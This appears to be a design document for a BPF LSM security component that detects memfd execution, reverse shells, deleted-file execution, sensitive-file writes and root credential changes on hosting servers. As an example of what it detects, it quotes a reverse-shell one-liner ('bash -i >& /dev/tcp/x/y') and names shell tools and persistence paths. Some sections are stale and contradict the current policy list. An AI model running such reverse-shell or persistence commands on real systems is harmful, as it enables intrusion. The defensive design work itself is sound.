# cfm-lsm — Userspace Behaviour Enforcement

## Status

**Six policies shipping. Monitor mode by default; enforce opt-in
for EXEC-001 / EXEC-003 / EXEC-004 / FS-005. CRED-002 and CRED-003 are
monitor-only by design (credential telemetry is not a safe blocking
point).**

Catalog:

- `CFML-EXEC-001` — Block exec from memfd
- `CFML-EXEC-003` — Reverse shell pattern
- `CFML-EXEC-004` — Deleted-file exec by web user
- `CFML-FS-005`   — Sensitive-file modification by web user
- `CFML-CRED-002` — Privilege escalation without setuid path *(monitor-only)*
- `CFML-CRED-003` — Direct root credential install *(monitor-only)*

Companion kernsec rule `KSEC-LSM-bpf-001` merges `bpf` into the
operator's existing `lsm=` boot argument when forced in
`/etc/cfm/kernsec.conf`, without disrupting other LSMs. Required
on distros where `bpf` is not in the default LSM list (most non-EL10
kernels). Opt-in.

All BPF LSM policies are implemented, compiled, and verified to
load on EL10 (kernel 6.12). The end-to-end flow:

```
operator: edit /etc/cfm/lsm.conf  →  enabled = true; pick per-policy mode
operator: systemctl restart cfm   →  daemon auto-enables on startup
cfm daemon: ApplyConfig           →  if pins absent (post-reboot or fresh):
                                       preflight + load + attach + pin
                                     if pins present (operator pre-enabled):
                                       adopt them
kernel  : detects events          →  BPF LSM hooks fire on matches
cfm daemon: drain ringbuf         →  emit notify + log + dmesg DETECT lines
operator: cfm lsm disable         →  unpin, kernel detaches (daemon stays up)
```

**Reboot semantics.** `/sys/fs/bpf` is a RAM-only kernel filesystem,
so a reboot wipes every pinned BPF object. The daemon handles this:
on every startup it inspects bpffs, and if no pins are found it
re-runs the load + attach + pin work itself. From the operator's
perspective, `enabled = true` in `lsm.conf` is the long-lived
declarative state; everything else is plumbing.

**`cfm lsm enable` is still useful.** Operators who want to
activate cfm-lsm immediately without restarting the daemon — or
who want the interactive enforce-mode confirmation prompt — can
run it directly. The daemon's auto-enable picks the same path.

Protection survives daemon restarts (the pins live in bpffs, not
in the daemon process), daemon crashes, and `systemctl stop cfm`
WITHIN the same kernel boot. After a reboot, the daemon's
auto-enable re-establishes protection on the way back up. Event
*collection* depends on the daemon (it drains the pinned ringbuf
and forwards events into the notify pipeline); event *detection*
does not.

All six policies default to monitor mode — matches are logged and
notified but the syscall proceeds. Enforce mode (return `-EPERM` on
a match, failing the calling process's syscall) is **available but
opt-in** for `CFML-EXEC-001`, `CFML-EXEC-003`, `CFML-EXEC-004`,
and `CFML-FS-005`; `CFML-CRED-002` and `CFML-CRED-003` are monitor-only by design
(returning -EPERM from credential hooks can deadlock systemd helpers
and pkexec mid-transition, and CRED-003 is fentry telemetry rather
than an LSM decision point; enable.go and lifecycle.go both downgrade
an enforce setting to monitor with a warning). Set `mode = enforce`
in `/etc/cfm/lsm.conf` and restart cfm (or run `cfm lsm disable`
then re-enable). The mechanism is a `volatile const` global in the
BPF program rewritten at load time via `cilium/ebpf`'s
`spec.Variables[name].Set()`, so enforce/monitor is baked into the
program's instruction stream — one byte-compare per match path, no
runtime branching cost. `cfm lsm enable` prompts for confirmation
when any policy is enforce; `--yes` skips the prompt for unattended
scripts. Recovery from a false-positive enforce block is one
command: `cfm lsm disable`.

This document supersedes an earlier broader draft that proposed a
fifteen-policy BPF LSM component spanning exec, credential, filesystem,
network, rate-limit, self-protection, and observability rules. After
evaluating that draft against the actual CFM tree and the production
stacks CFM targets (cPanel + CloudLinux + KernelCare, DirectAdmin +
CloudLinux + KernelCare, Proxmox Debian KVM ZFS), most of the proposed
catalogue duplicated protections already provided by CageFS, LVE,
Imunify360 Proactive Defense, `kernsec`, and `internal/outbound/`, and
a few policies actively conflicted with the rest of the stack (notably
KernelCare/Ksplice module reloads vs the proposed module-load lockdown,
and Yama `ptrace_scope=1` already shipped by `kernsec` vs the proposed
ptrace LSM rule).

The scope here is intentionally narrow: six shipping policies
covering exec (CFML-EXEC-001 / CFML-EXEC-003 / CFML-EXEC-004),
sensitive-file write (CFML-FS-005), post-setuid credential transitions
(CFML-CRED-002), and direct root credential installs (CFML-CRED-003). The MVP shipped
with EXEC-001 + EXEC-003 only; FS-005 + CRED-002 landed as the
next-policies pass once the MVP's verifier and pinning behaviour
proved stable on EL10. CRED-003 closes the documented direct
`commit_creds()` gap as monitor-only telemetry. Anything beyond
these six requires a separate, named proposal — not a TODO inside
this doc.

The implementation shape is also fixed: an in-binary subsystem of the
existing CFM daemon at `internal/lsm/`, loading CO-RE BPF LSM programs
via [`cilium/ebpf`](https://github.com/cilium/ebpf). No separate
daemon, no kernel module, no DKMS, no clang on the customer host. CFM
stays `CGO_ENABLED=0`. See the Architecture section for details.

## Overview

`cfm-lsm` is the CFM component that catches the post-exploit consequences
of a successful userspace compromise: a webshell that drops a payload and
tries to execute it from memory, or a hijacked process that pivots into a
reverse shell. These behaviours are invisible to the other CFM layers —
`webdetector` has already returned by the time exec happens, and
`kernsec` operates on preemptive surface reduction (sysctls, boot
arguments, module blacklists, mount audit) rather than runtime decisions.

`cfm-lsm` deliberately is not a generic syscall observer (that is
Tetragon's design space, not CFM's); not a replacement for CageFS, LVE,
or Imunify360 (it sits alongside them); and not an outbound network
policy engine — that work belongs in the existing per-uid NFLOG path
in `internal/outbound/`, which is already designed for exactly that
problem and works on EL8 without DKMS.

## Position in the CFM stack

```
HTTP layer        webdetector       (inbound request analysis, vhost policy,
                                     challenge/block via nftables)
                       ↓
Userspace layer   cfm-lsm           (process behaviour: memfd exec,
                                     reverse shell pattern)
                       ↓
Kernel layer      kernsec           (sysctls, boot args, modules, fstab —
                                     preemptive surface reduction)
```

Each layer detects what the others cannot. `cfm-lsm` occupies the
narrow band between "the HTTP request that caused the compromise" and
"the kernel-surface that the operator already removed" — specifically,
the moment a compromised process tries to do the thing the attacker
came for.

## Scope rationale

The original draft listed fifteen policies; this design ships two.
Every other ID from that draft is excluded for a specific reason — not
deferred, excluded — because some other layer in CFM's expected stack
already covers it, or because the policy actively conflicts with
something else CFM relies on.

| Policy | Decision | Reason |
|---|---|---|
| `CFML-EXEC-001` (memfd exec) | **In, enforce** | High-signal, low-FP; Imunify PD cannot see past the PHP→child process boundary; no other CFM layer covers this. |
| `CFML-EXEC-003` (reverse shell pattern) | **In, monitor → enforce** | Behavioural detection; covers ground Imunify PD blocks at *launch* but cannot catch *post-spawn*; no other CFM layer covers this. |
| `CFML-EXEC-002` (Trusted Path Execution) | **Out** | High FP from composer / npm / pip / wp-cli; CageFS + Imunify PD + `kernsec`'s `noexec` mount audit already cover the realistic vector. |
| `CFML-OBS-001` (ptrace lockdown) | **Out — already covered by `kernsec`** | `kernel.yama.ptrace_scope=1` is shipped today by `kernsec` (see `internal/kernsec/profile.go:188`). If stricter is wanted, ship `=2` as a `kernsec` Tier 2 sysctl rule — no new code, no new LSM hook. |
| `CFML-NET-001` (outbound per vhost) | **Out — wrong component** | `internal/outbound/analyzer.go` already does per-uid NFLOG-based outbound observation. Promoting that path to enforce + per-vhost policy is the right home for this; it works on EL8 with no DKMS and reuses an existing event pipeline. |
| `CFML-FS-001`, `CFML-SELF-001`, `CFML-CRED-*`, `CFML-RATE-*`, `CFML-SELF-002`, `CFML-FS-002`, `CFML-FS-003` | **Out** | Each is covered by an existing layer: CageFS for FS-write vectors on caged users, LVE for fork/rate, `kernsec` for module surface (and `CFML-SELF-002` would actively conflict with KernelCare/Ksplice live-patch module reloads), webdetector for webshell-drop correlation. If any one of these later proves necessary it will be added in a separate, named proposal — not as an open TODO in this doc. |

## Stack-specific notes

**cPanel + CloudLinux + KernelCare.** Full MVP applies. Per-user CageFS
already namespaces PHP-FPM workers away from the FS-write vectors the
excluded `CFML-FS-*` policies aimed at, which is why those stay out.
KernelCare's live-patch module loads post-boot, but the MVP does not
constrain module loading at all, so there is nothing to whitelist.

**DirectAdmin + CloudLinux + KernelCare.** Same as cPanel.

**Proxmox Debian KVM ZFS.** Hypervisor hosts run essentially no PHP
workload, so the value of `cfm-lsm` collapses to "catch a reverse shell
or memfd exec on the hypervisor itself." That is still worth doing on
hosts with administrative SSH exposure, but the default should be
host-profile-aware: `cfm-lsm` either disabled by default on detected
hypervisors, or restricted to `CFML-EXEC-001` alone. The host-profile
signal already exists in `internal/kernsec/profile.go` (Proxmox is
already a recorded host context); `cfm-lsm` should consume it rather
than reinvent the detection.

## Policy catalogue — MVP

### `CFML-EXEC-001` — Block exec from memfd

| | |
|---|---|
| Hook | `bprm_check_security` |
| Default mode | `enforce` |
| FP risk | Very low |
| Perf impact | Negligible (exec is not a hot path) |

**Description.** Refuse `execve` when the `bprm`'s backing file has no
on-disk path — i.e. when it is anonymous shmem from `memfd_create` or
equivalent. The mechanism in BPF is to inspect `bprm->file`, check that
the superblock magic is `TMPFS_MAGIC`, and that the dentry has no
linked path. If both hold, return `-EPERM`.

**Rationale.** `memfd_create` + `execve` is the canonical fileless
payload pattern. It is the next step after a webshell finishes
downloading a binary into memory, and it is the technique most
post-exploit kits reach for once they realise the disk is monitored.
Legitimate uses on hosting servers are vanishingly rare. The
signal-to-noise ratio of this single rule is higher than any other
behaviour-detection rule in the original fifteen-policy draft.

**Exemptions.** uid 0 with a TTY (interactive root); a configured
parent-process whitelist for legitimate build tooling that genuinely
needs it; an optional per-host opt-out for podman / systemd-nspawn on
Proxmox hypervisors that legitimately exec from anonymous fds during
container start.

**Notes.** Exec is a cold path. Perf overhead is invisible. This is
the rule to ship first, monitor briefly, and promote to enforce.

### `CFML-EXEC-003` — Reverse shell pattern

| | |
|---|---|
| Hook | `bprm_check_security` (with optional follow-up at `task_alloc`) |
| Default mode | `monitor` for 30 days, then `enforce` |
| FP risk | Low |
| Perf impact | Negligible |

**Description.** At `bprm_check`, walk the task's fd table for fds
0, 1, and 2. For each, check whether it is socket-backed and whether
the socket is connected to a remote peer — not a pty, not a unix-domain
socket to a local service, not a regular file. A process about to exec
with all three of stdin / stdout / stderr dup'd to a connected remote
socket is a reverse shell, regardless of which binary it is (`bash`,
`nc`, `socat`, `python -c`, `perl -e`, obfuscated one-liners).

**Rationale.** Behavioural detection, not binary match. Imunify PD
blocks the *call* that launches `bash -i >& /dev/tcp/x/y`; this rule
catches the resulting `bash` process *being* a reverse shell. The two
layers are complementary: PD covers the PHP-originating launch,
`cfm-lsm` covers the spawned process. The combination is robust against
the most common evasion of PD (using the launcher binary directly,
without going through `exec`/`system`/`shell_exec` in PHP first).

**Exemptions.** uid 0 (root reverse shells are an administrative
choice, not an attack vector to enforce against). An explicit per-host
list for any legitimate inetd-style services that genuinely dup socket
fds onto 0/1/2 — these are rare on hosting boxes.

**Notes.** The fd walk is the implementation cost driver and the
verifier-complexity risk on older RHEL 9 kernels. The hot loop must be
bounded (cap at fd ≤ 2) and the socket-state read must use existing CO-RE
relocations rather than custom field offsets. Budget verifier complexity
explicitly before committing the design to that hook layout.

### `CFML-EXEC-004` — Deleted-file exec by web user

| | |
|---|---|
| Hook | `bprm_check_security` |
| Default mode | `monitor`; enforce is opt-in after telemetry |
| FP risk | Unknown-low; intentionally monitor-first |
| Perf impact | Negligible (exec is not a hot path) |

**Description.** At `bprm_check_security`, inspect
`bprm->file->f_path.dentry` and the backing inode. A process that
opens a payload, unlinks it, and then executes the still-open file
typically leaves two kernel-side clues: the inode link count is zero
and/or the dentry has been unhashed from the namespace. `CFML-EXEC-004`
emits an event when either state is present and the calling uid is in
`cfm_watched_uids` (the daemon-populated web-class uid set used by
`CFML-FS-005`). The implementation also consumes the web-origin task
state when that tracker is enabled, but origin-only matches remain
monitor-only while telemetry is gathered.

**Rationale.** Deleted-file exec is a common stealth step after web
compromise: stage a binary on disk, open it, unlink it to evade simple
path-based scanners and cleanup sweeps, then execute via the open file
descriptor. The behaviour is more specific than “web user execs from
/tmp” and complements `CFML-EXEC-001`: memfd/fileless payloads stay
owned by EXEC-001, while EXEC-004 covers ordinary filesystem payloads
that were subsequently unlinked.

**Enforcement.** The default and recommended production rollout is
`mode = monitor`. `mode = enforce` is supported but should be enabled
only after host-local telemetry confirms no legitimate panel helpers,
backup tools, deployment systems, or AV/updater workflows execute
unlinked files under web-class uids. Web-origin-only matches are
reported but not blocked even when the policy is set to enforce.

**Example config.**

```ini
[policy "CFML-EXEC-004"]
mode = monitor   # start here; promote to enforce only after telemetry

# Later, on hosts with a clean baseline:
# mode = enforce
```

### `CFML-FS-005` — Sensitive-file modification by web user

| | |
|---|---|
| Hook(s) | `inode_setattr`, `inode_create`, `inode_link`, `inode_unlink`, `inode_rename`, `inode_setxattr`; origin markers on `bprm_check_security`, `task_fix_setuid`, and `task_alloc` |
| Default mode | `monitor`; enforce is opt-in |
| FP risk | Very low on CageFS hosts; low–medium on plain hosts |
| Perf impact | Negligible — only fires on rare write-class operations against a small inode set |

**Description.** Six write-class BPF LSM programs share one check helper.
Historically, that helper matched only the task's **current uid**: on every
write-class inode operation, it looks up the calling task's uid in the
daemon-populated `cfm_watched_uids` hash (web-class names — apache, nginx,
php-fpm, lsphp, alt-php-* — plus every cPanel and DirectAdmin account uid).
If matched, it looks up the target filesystem+inode key in
`cfm_watched_inodes` (the daemon stats the stable core list in
`internal/lsm/maps.go::DefaultCoreSensitivePaths`, the persistence list in
`DefaultPersistencePaths`, and any operator `persistence_path = ...` additions,
then records `st_dev` + `st_ino`). Both hits → emit event. Enforce mode can
return `-EPERM` only for entries marked as stable core paths; persistence-path
entries are monitor-only by default even when `mode = enforce`.

**Web-origin matching.** FS-005 can also run an origin tracker gated by
`origin_tracking = monitor` in `/etc/cfm/lsm.conf`. The tracker uses
task-local BPF storage to mark tasks whose real/effective/fs uid matches
`cfm_watched_uids`, refreshes that mark on exec and setuid-family transitions, and copies it to children on
fork/clone through the `task_alloc` hook. A later sensitive write therefore
still matches even if the process has become uid 0 by the time it touches the
file. Origin-only events set the FS-005 web-origin flag and are
**monitor-only** for now: they are reported even if `mode = enforce`, but they
do not return `-EPERM` until telemetry shows the false-positive rate is safe.

**Filesystem+inode matching avoids BPF-side path walking entirely.** For
operations that create new files under a watched directory (e.g.
`/etc/sudoers.d/backdoor`), the `inode_create` hook reads the parent
dentry's filesystem+inode identity and matches that against the
same set — the daemon includes the dir keys alongside the file keys.

**Rationale.** This is the high-value catch for kernel 0-day cash-ins.
A Dirty Pipe or pwnkit attacker that successfully escalated still has
to *use* the privilege — typically by writing to `/etc/shadow`,
`/etc/sudoers`, or `/root/.ssh/authorized_keys`. Those writes go
through the standard syscall path even when the privesc primitive
bypassed earlier LSM hooks, so cfm-lsm sees them.

**Enforcement.** Available via `mode = enforce` in `lsm.conf` for
current-uid matches on the stable core path set (`/etc/passwd`, `/etc/shadow`,
`/etc/group`, `/etc/gshadow`, `/etc/sudoers`). Web-origin-only matches and all
host-persistence path matches deliberately stay monitor-only while operators
build a baseline. This keeps the new persistence coverage inside `CFML-FS-005`
rather than creating `CFML-FS-006`, while preserving the original low-risk
enforcement boundary.

**Host-persistence paths.** The default monitor-only persistence set includes
common distro and panel locations used for durable post-exploit hooks:

| Host class | Example paths |
|---|---|
| Debian / Ubuntu / EL10 | `/etc/systemd/system`, `/etc/systemd/user`, `/etc/cron.d`, `/etc/cron.daily`, `/etc/cron.hourly`, `/etc/cron.weekly`, `/etc/cron.monthly`, `/etc/crontab`, `/etc/sudoers.d`, `/etc/pam.d`, `/etc/ssh/sshd_config.d`, `/root/.ssh` |
| cPanel / WHM | `/usr/local/cpanel/hooks`, `/var/cpanel/hooks`, `/usr/local/cpanel/scripts/postupcp`, `/usr/local/cpanel/scripts/preupcp`, `/var/cpanel/perl5/lib`, `/var/cpanel/easy/apache/profile/custom` |
| DirectAdmin | `/usr/local/directadmin/scripts/custom`, `/usr/local/directadmin/data/templates/custom` |

Operators can add site-specific persistence locations without widening the
enforceable core set:

```ini
[policy "CFML-FS-005"]
mode = monitor
origin_tracking = monitor
persistence_path = /etc/systemd/system
persistence_path = /opt/vendor-panel/hooks
```

`persistence_path` values must be absolute concrete paths; glob expansion is not
performed in the BPF path. Missing paths are skipped at map-population time so a
single panel-specific entry can be present in a shared config across cPanel,
DirectAdmin, Debian/Ubuntu, and EL10 hosts.

**False-positive profile.** Current-uid matches retain the original FS-005
profile: very low on CageFS hosts and low–medium on plain hosts. Web-origin
matching is intentionally broader. It can alert on legitimate root helpers,
package hooks, or panel maintenance workers that were launched by a web/panel
account and later acquired uid 0 before touching a watched path. Those are
valuable forensic breadcrumbs during compromise response, but they need
monitor-mode review before any blocking decision.

### `CFML-CRED-002` — Privilege escalation without setuid path

| | |
|---|---|
| Hook | `task_fix_setuid` |
| Default mode | `monitor` (only) |
| FP risk | Low — daemon walks `/usr/bin`, `/usr/sbin`, `/usr/libexec`, `/bin`, `/sbin` for setuid binaries and whitelists their filesystem+inode keys |
| Perf impact | Cold — fires only on setuid-family syscalls (setresuid / setuid / setreuid / setfsuid), bounded by a single map lookup |

**Description.** One BPF program at `task_fix_setuid`. Reads the new
and old credential structs after the setuid syscall has written them.
Only continues when `new.euid == 0 && old.euid != 0` (non-root →
root). Then resolves `current->mm->exe_file`'s filesystem+inode key
and looks it up in `cfm_setuid_inodes`. If the key is NOT in the whitelist, the
process is gaining root via a setuid syscall from a binary that does
not carry the suid bit on disk — the canonical post-exploit
fingerprint where a kernel exploit installed root creds and the
attacker pivots through `setresuid(0,0,0)` from a webshell or
similar. Emit event; never block.

**Hook choice — task_fix_setuid, not cred_prepare.** The earlier
draft attached to `cred_prepare`, but `cred_prepare` runs inside
`prepare_creds()` *before* the caller has mutated `new->euid` —
at that point `new` is a byte-for-byte copy of `old`, so a
"non-root → root" gate is mathematically unsatisfiable and the
program emits zero events. `task_fix_setuid` fires from the setuid
syscall paths *after* the new cred's uid fields have been written,
so the comparison is meaningful. The narrower hook does mean
CRED-002 does not catch kernel exploits that install creds directly
via `commit_creds(prepare_kernel_cred(NULL))` without going through
a userspace setuid syscall; `CFML-CRED-003` is the complementary
monitor-only rule for that direct install path.

**Monitor-only by design.** Returning `-EPERM` from the cred-install
path can deadlock systemd helpers and pkexec mid-transition (kernel
auth bugs, polkit weirdness, container runtime cred manipulation).
The value is in the alert, not the block. `cfm lsm enable` silently
downgrades a `mode = enforce` setting on this policy to `monitor`
with a clear warning, so an operator who copies an enforce setting
from a different policy still gets safe behaviour.


### `CFML-CRED-003` — Direct root credential install

| | |
|---|---|
| Hook | `fentry/commit_creds` (optional per-policy telemetry; skipped when unavailable) |
| Default mode | `monitor` (only) |
| FP risk | Low — emits only for non-root current credentials installing uid/euid 0 and suppresses transitions already observed by `task_fix_setuid` |
| Perf impact | Cold — fires on credential commits only; event path is gated by simple uid comparisons |

**Description.** A tracing program attaches to `commit_creds` and compares
the current task's active credential state with the credential pointer being
installed. It emits only when a non-root task (`old.uid != 0` and
`old.euid != 0`) installs root credentials (`new.uid == 0` and
`new.euid == 0`). The BPF side marks credential pointers observed by
`task_fix_setuid`; if `commit_creds` receives that exact pointer, CRED-003
suppresses its event and leaves the transition to `CFML-CRED-002`. This
keeps CRED-003 focused on direct credential installation paths that bypass
`task_fix_setuid`, such as kernel exploit payloads that call
`commit_creds(prepare_kernel_cred(NULL))`.

**Relationship to CRED-002.** CRED-002 is the setuid-family syscall view:
it has old/new credentials from the LSM hook and can apply the setuid-binary
inode whitelist. CRED-003 is the direct install view: it sees the final
`commit_creds` call even when no setuid syscall LSM hook fired. The rules are
therefore complementary rather than replacements. Operators should enable both
in monitor mode when investigating privilege-escalation attempts.

**Monitor-only by design.** `fentry/commit_creds` is telemetry, not an LSM
decision hook, so CRED-003 never blocks. If a kernel does not expose a usable
`commit_creds` tracing target, preflight reports only `CFML-CRED-003` as
unavailable; the rest of cfm-lsm remains usable and can still attach.

**Companion kernsec rule.** `KSEC-LSM-bpf-001` (in `internal/kernsec/`)
appends `bpf` to the operator's existing `lsm=` boot argument when
forced in `/etc/cfm/kernsec.conf`. Required on distros where `bpf` is
not in the default LSM list (most non-EL10 kernels). Opt-in via
`[rule "KSEC-LSM-bpf-001"] state = force`. Symmetric unmerge on disable.

## Out of scope (with rationale)

For each excluded policy ID, one short paragraph on what already covers
that ground. Reviewers and future maintainers will read this section
first when they ask "why doesn't `cfm-lsm` do X." These are permanent
decisions, not TODOs.

- **`CFML-EXEC-002` (TPE).** Composer, npm, pip, yarn, wp-cli, drush,
  and cPanel's own auto-installer all legitimately exec from per-user
  writable directories. The FP surface is wide and the whitelist
  becomes a permanent tuning treadmill. The realistic vector this rule
  targets (PHP execs `/tmp/dropped-binary`) is already covered by
  Imunify PD at the PHP layer, by CageFS at the FS layer on
  CloudLinux, and by `kernsec`'s `/tmp`, `/var/tmp`, `/dev/shm`
  `noexec` mount audit at the kernel layer. Adding a fourth layer for
  the same vector is not worth the operational cost.

- **`CFML-OBS-001` (ptrace lockdown).** `kernsec` already ships
  `kernel.yama.ptrace_scope=1` in its default Tier 1 ruleset
  (`internal/kernsec/profile.go:188`). Yama scope 1 already restricts
  non-root processes to ptracing only their own children — which is
  exactly the behaviour this LSM rule would have enforced. If a host
  wants the stricter "non-root cannot ptrace at all" semantics, the
  right answer is to add `kernel.yama.ptrace_scope=2` as a `kernsec`
  Tier 2 sysctl rule. One line of config, no new kernel hook.

- **`CFML-NET-001` (outbound per vhost).** `internal/outbound/`
  already implements per-uid NFLOG-based outbound observation
  (`internal/outbound/analyzer.go`) with sliding-window thresholds for
  SMTP, scan, and HTTP, with forensic enrichment and deduplication.
  The right way to deliver per-vhost outbound enforcement is to
  promote that existing path from observe to enforce, not to bolt a
  parallel BPF LSM implementation onto a different hook surface. As a
  bonus the NFLOG path works on EL8 without DKMS.

- **`CFML-FS-001` (SSH backdoor injection).** Genuinely valuable on
  paper, but on the stacks CFM targets the realistic attacker (a
  compromised PHP-FPM worker) is already inside CageFS on a CloudLinux
  host and physically cannot see `~/.ssh/authorized_keys` for
  arbitrary users. Non-caged users — rare on a typical cPanel /
  DirectAdmin deployment — would benefit, but not enough to justify
  the FS-hook implementation cost as a standalone CFM rule. If this
  ever becomes necessary it deserves its own proposal.

- **`CFML-FS-002` (cron persistence).** Same logic as `CFML-FS-001`.
  CageFS already prevents the realistic attacker from writing to cron
  paths.

- **`CFML-FS-003` (web-root suspicious file creation).** The
  correlation value (`.php` dropped within 30s of suspicious POST)
  belongs in `webdetector`, not in an LSM hook. The LSM hook would
  only generate the event; the decision logic is HTTP-layer
  correlation.

- **`CFML-CRED-001`, `CFML-CRED-002` (credential / capability
  watch).** LVE and CageFS already constrain the realistic
  per-user credential surface on CloudLinux. The remaining ground
  (root-equivalent cred mutation by non-setuid paths) overlaps with
  what an LKRG-class kernel integrity tool would cover; CFM does not
  ship that layer, so adding a BPF LSM half-measure is the wrong
  shape.

- **`CFML-RATE-001`, `CFML-RATE-002` (segfault / fork rate
  throttling).** LVE owns per-user resource limits on CloudLinux. On
  non-CloudLinux hosts these would have value, but not enough to
  justify carrying the rate-limit machinery for two different host
  classes.

- **`CFML-SELF-001` (CFM self-protection).** Worth doing one day, but
  not via a BPF LSM hook in this MVP. A `fanotify` watch on the CFM
  binary / config tree is a much cheaper way to get the same signal,
  and `cfm-lsm` does not yet exist on disk for there to be anything
  to protect at the LSM layer.

- **`CFML-SELF-002` (module load lockdown post-boot).** Actively
  conflicts with KernelCare and Ksplice live-patch module loads,
  which are a core part of the CFM target stack. Implementing this
  rule would require maintaining a whitelist of every live-patch
  module suffix in perpetuity, which is brittle. `kernsec` already
  explicitly leaves `kernel.modules_disabled` unsupported for
  related reasons.

## Prior art — what to borrow (and what not to)


### Falco

What is reusable: Falco's **public rule corpus**. Their existing rules
`Memfd Create Then Execute` and `Reverse Shell` cover exactly the two
behaviours of this MVP. Their detection logic — memfd-backed exec via
inode and dentry inspection, reverse-shell via fd 0/1/2 socket-dup
walking — is the same shape this design lands on independently. The
practical value is in the exemption sets Falco has accumulated over
many production hosts: which build tools legitimately exec from memfd,
which container runtimes dup socket fds. Read the rules, lift the
exemption lists as a starting point, reimplement the detection
clean-room against BPF LSM hooks.


## Related future work

A complementary future component — a CFM-built Zend PHP extension that
intercepts dangerous PHP function calls at the VM layer, for hosts
without Imunify360 Proactive Defense — is described separately in
[`cfm-php.md`](./cfm-php.md). It is out of scope for `cfm-lsm` because
it operates at a different layer (PHP Zend VM, not kernel LSM hooks)
and is a different project on a different timeline. It is recorded
here only to answer the inevitable "why doesn't `cfm-lsm` block
dangerous PHP functions directly?" That work, if it happens, lives in
`cfm-php`, not here.

## Architecture

The implementation details below are sketches, not commitments. They
exist so a future implementer has a sane starting point, not so this
doc becomes a blocker on choosing a different approach later.

The shape is deliberately **not** "separate C daemon + DKMS module +
log file that CFM tails." That model would be the only CFM component
to work that way, would require running clang on every customer host,
and would invite the version-skew and IPC problems that come with a
second binary. Instead, `cfm-lsm` follows the same in-binary subsystem
pattern as `internal/outbound/` and `internal/kernsec/`.

### Backend

BPF LSM via CO-RE, loaded by the existing CFM Go daemon using
[`cilium/ebpf`](https://github.com/cilium/ebpf). No libbpf C
dependency on the runtime side; no kernel module; no DKMS. EL8 is
explicitly unsupported for `cfm-lsm`; EL8 hosts continue to rely on
`kernsec`, the existing `internal/outbound/` sentinel, and Imunify
(where licensed). Maintaining a DKMS LKM backend across
KernelCare-patched RHEL 8 kernels would be a perpetual maintenance
tax this MVP does not pay.

### Build model — no CGO, no clang on the install target

CFM builds with `CGO_ENABLED=0` (see `Makefile:53`). That stays true
for `cfm-lsm`. The mechanics:

- The BPF C sources live in-tree at `internal/lsm/bpf/*.bpf.c` with a
  CO-RE `vmlinux.h`.
- `go generate` invokes
  [`bpf2go`](https://github.com/cilium/ebpf/tree/main/cmd/bpf2go) from
  `cilium/ebpf`, which calls clang to produce the compiled BPF object
  plus Go bindings that wrap it.
- The compiled `.o` and the generated Go bindings are **committed to
  the repo**. `go build` does not call clang; it just embeds the
  pre-compiled bytecode via `go:embed`.
- `CGO_ENABLED=0` continues to work because `cilium/ebpf` is pure Go
  — it talks to the kernel via `bpf(2)` syscalls through
  `golang.org/x/sys/unix`, not via libbpf.
- The Go runtime loads the embedded bytecode, CO-RE-relocates it for
  the running kernel, and attaches it to LSM hooks. No clang on the
  customer host. No kernel headers on the customer host.

Build-time deps for **contributors who change the BPF programs**
(documented in a `## Building` section, separate from runtime
install): clang ≥ 11, libelf-dev, kernel headers ≥ 5.7 for
`vmlinux.h` regeneration, optionally `bpftool` for debugging.

Build-time deps for **everyone else** (downstream packagers,
end-user installs, CI that doesn't touch `.bpf.c`): none beyond
what CFM already needs.

### In-tree layout

```
internal/lsm/
├── lsm.go               # subsystem lifecycle: attach, detach, ring read loop
├── policy.go            # /etc/cfm/lsm.conf parser (INI, same shape as kernsec.conf)
├── events.go            # event types, fed into the existing CFM event bus
├── cli.go               # `cfm lsm status`, `cfm lsm policy <id>`, etc.
├── bpf/
│   ├── memfd_exec.bpf.c # CFML-EXEC-001 BPF LSM program
│   ├── revshell.bpf.c   # CFML-EXEC-003 BPF LSM program
│   ├── common.bpf.h     # shared helpers, map definitions, event struct
│   └── vmlinux.h        # CO-RE kernel type definitions (committed)
├── bpf_bpfel.go         # bpf2go-generated bindings (committed)
├── bpf_bpfel.o          # bpf2go-compiled BPF object (committed)
└── doc.go
```

### Runtime — single daemon, single unit, single config

A subsystem inside the existing CFM daemon, not a separate
`cfm-lsmd` process. The reasoning: BPF event delivery is in-process
already (the ringbuf reader is a goroutine), LSM event processing
is not crash-prone enough to justify a second daemon, and the
host-profile detection code lives in the existing binary already
(`internal/kernsec/profile.go`). Reuse, don't fork.

There is no "cfm-lsmd writes a log file that cfm watches" seam.
Events flow from the ringbuf reader goroutine onto the same
in-process channel that `internal/outbound/` already feeds into the
notify, JSON-log, and webdetector-correlation paths.

A single systemd unit (the existing `cfm.service`). A single config
file. A single log destination (`/var/log/cfm/lsm.jsonl`).

### Privileges

BPF LSM loading needs `CAP_BPF` + `CAP_PERFMON` + `CAP_SYS_ADMIN`.
The CFM daemon already runs with the privileges it needs for
nftables and NFLOG (see `configs/cfm.service` for the existing
hardening profile); the additional caps required for BPF LSM
attach are within the same envelope and do not require a privilege
boundary split. If a future iteration of CFM ever drops the main
daemon to a lower-cap user, the cleanest split is a small one-shot
`cfm-lsm-loader` helper that attaches programs at start and exits
— not a long-running second daemon. That is a refinement for later,
not part of the MVP.

### Host-profile reuse

Consume the existing detection in `internal/kernsec/profile.go`
(cPanel, DirectAdmin, CloudLinux / LVE, CageFS, Imunify360,
KernelCare, Ksplice, Proxmox, ZFS, EFI). Do not reimplement
detection.

### Event shape

Match the per-uid event shape that `internal/outbound/analyzer.go`
already emits, so downstream pipeline code can consume both sources
symmetrically. The BPF programs write a minimal fixed-size struct
into a per-CPU ringbuf; the Go side enriches it (pid → cgroup → user
→ vhost) before forwarding to the event bus.

### Config

`/etc/cfm/lsm.conf`, INI-style, same format as
`/etc/cfm/kernsec.conf`. The earlier draft proposed TOML; align with
the existing format in the rest of CFM instead. Three modes per
policy: `disabled`, `monitor`, `enforce`. Per-vhost overrides are
reserved for future use; these policies are not vhost-keyed and do
not need them.

Example monitor-first rollout for deleted/unlinked executable telemetry:

```ini
[policy "CFML-EXEC-004"]
mode = monitor
```

Promote only after reviewing telemetry from the local host:

```ini
[policy "CFML-EXEC-004"]
mode = enforce
```

The `enforce` vs `monitor` decision is **compiled into the BPF
program at load time** via a `bpf2go` constant rewrite, so the hot
path does not branch on the mode and runtime cost is identical in
both modes.

## How it works — lifecycle, CLI, and kernel preflight

cfm-lsm separates **detection** (kernel-level, BPF programs attached
to LSM hooks) from **event collection** (userspace, the cfm daemon
drains the ringbuf). The split matters because protection has to be
reliable across daemon restarts — block decisions happen inside the
kernel, independent of whether userspace is alive.

### Default state — off

cfm-lsm ships **disabled by default**. A fresh install does not
attach any BPF programs. The operator opts in by running
`cfm lsm enable` once. From then on the attachments survive cfm
